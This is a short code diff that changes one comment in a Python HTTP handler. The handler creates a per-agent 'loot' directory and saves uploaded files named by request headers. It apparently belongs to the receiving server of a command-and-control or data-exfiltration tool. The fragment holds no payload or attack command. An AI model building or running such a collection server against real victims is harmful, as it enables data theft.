@@ -140,7 +140,7 @@ class GetHandler(BaseHTTPRequestHandler):
             # directory for the agent.  If not, make them
             if not os.path.isdir(loot_path):
                 os.makedirs(loot_path)
-            # Read the length of the screenshot file being uploaded
+            # Read the length of the file being uploaded
             length = self.headers['content-length']
             filename = self.headers['Filename']
             data = self.rfile.read(int(length))
